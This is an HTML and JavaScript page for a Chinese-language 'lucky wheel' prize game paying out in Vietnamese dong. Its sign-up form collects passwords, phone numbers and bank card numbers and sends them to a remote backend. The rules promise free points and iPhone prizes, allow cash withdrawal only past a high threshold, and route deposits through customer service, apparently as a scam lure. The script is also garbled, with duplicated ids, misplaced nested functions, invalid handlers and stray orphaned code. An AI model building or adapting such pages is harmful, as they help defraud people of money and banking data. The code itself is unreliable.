<!DOCTYPE html>
<html>
<head>
  <title>幸运转盘</title>
  <style>
    body { text-align:center; font-family: Arial; }

    #wheel {
      width:200px;
      height:200px;
      border:10px solid #f90;
      border-radius:50%;
      margin:20px auto;
      line-height:200px;
      font-size:20px;
      transition: transform 3s ease;
    }

    button { padding:10px 20px; margin:10px; font-size:16px; }

    .rule {
      width:90%;
      margin:auto;
      text-align:left;
      background:#f5f5f5;
      padding:10px;
      border-radius:10px;
    }
  </style>
</head>
<input id="username" placeholder="请输入用户名">
<div id="registerBox" style="display:none;position:fixed;top:30%;left:50%;transform:translate(-50%,-50%);
background:white;padding:20px;border:1px solid #ccc;border-radius:10px;">

  <h3>注册账号</h3>

  <input id="username" placeholder="用户名"><br><br>
  <input id="password" type="password" placeholder="账号密码"><br><br>
  <input id="phone" placeholder="手机号码"><br><br>
  <input id="bank" placeholder="银行卡号码"><br><br>

  <button onclick="submitRegister()">提交</button>
  <button onclick="closeRegister()">关闭</button>

</div>

<h1>🎉 幸运转盘</h1>

<div style="position:relative;width:300px;height:300px;border:10px solid orange;border-radius:50%;margin:auto;">

  <!-- 🎯 中间指针 -->
  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px;">
    🎯
  </div>

</div>

<p>积分：<span id="points">0</span></p>
<p>现金：<span id="cash">0</span></p>

<button onclick="showRegister()">注册</button>
<button onclick="log in ()">登录</button>
<button onclick="spin()">抽奖</button>
<button onclick="recharge()">充值</button>

<h2 id="result"></h2>

<!-- 游戏规则 -->
<div class="rule">
<h3>📜 游戏说明</h3>
<p>🎁 免费注册，注册即送100,000积分</p>
<p>🎯 30,000积分 = 1次抽奖</p>
<p>🏆 奖项：</p>
<ul>
<li>10000积分</li>
<li>20000积分</li>
<li>苹果手机</li>
<li>苹果耳机</li>
<li>10000越南盾现金</li>
</ul>
<p>💱 兑换比例：100积分 = 1越南盾</p>
<p>💰 满100万越南盾可提现</p>
</div>

<script>
const API = "https://lucky-spin-production.up.railway.app"; // ⚠️必须替换

function register(){
  let userId = document.getElementById("username").value;

   if(!userId){
    document.getElementById("result").innerText = "❗请输入用户名";
    return;
  }
function showRegister(){
  document.getElementById("registerBox").style.display = "block";
}

function closeRegister(){
  document.getElementById("registerBox").style.display = "none";
}
  fetch(API + "/register", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({userId})
  })
  .then(r=>r.json())
  .then(d=>{
    updateUI(d);
    document.getElementById("result").innerText = "注册成功！";
  });
}

// 更新UI
function updateUI(data){
  document.getElementById("points").innerText = data.points;
  document.getElementById("cash").innerText = data.cash;
}

// 注册
function submitRegister(){
  let userId = document.getElementById("username").value;
  let password = document.getElementById("password").value;
  let phone = document.getElementById("phone").value;
  let bank = document.getElementById("bank").value;

  if(!userId  !password  !phone || !bank){
    alert("请填写完整信息");
    return;
  }

  fetch(API + "/register", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      userId,
      password,
      phone,
      bank
    })
  })
  .then(r=>r.json())
  .then(d=>{
    updateUI(d);
    document.getElementById("result").innerText = "✅ 注册成功，送100000积分";
    closeRegister();
  });
}

    // 👇 关键判断（防止报错）
    if(data.points !== undefined){
      updateUI(data);
      document.getElementById("result").innerText = "✅ 注册成功！送100000积分";
    }else{
      alert("❌ 注册失败（后端没返回数据）");
    }
  })
  .catch(err => {
    console.log(err);
    alert("❌ 注册失败（服务器连接失败）");
  });
}

// 抽奖
function spin(){
   let userId = document.getElementById("username").value;

  if(!userId){
    document.getElementById("result").innerText = "❗请先输入用户名";
    return;
  }

  fetch(API + "/spin", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({userId})
  })
  .then(r=>r.json())
  .then(d=>{
    if(d.error){
      document.getElementById("result").innerText = d.error;
    }else{
      updateUI(d.user);
     let text = "";

if(d.reward.type === "points"){
  text = "🎉 恭喜获得 " + d.reward.value + " 积分";
}
else if(d.reward.type === "cash"){
  text = "💰 恭喜获得 " + d.reward.value + " 越南盾";
}
else if(d.reward.type === "none"){
  text = "😢 很遗憾未中奖，再试一次！";
}
else{
  text = "🎁 获得奖品：" + d.reward.value;
}

document.getElementById("result").innerText = text;
    }
  })
  .catch(()=>{
    alert("❌ 抽奖失败（服务器没连上）");
  });
}

// 充值
function recharge(){
  alert(`
💰 充值方式：

MoMo / 银行 / Zalo
联系客服完成充值
`);
}
</script>

</body>
</html>
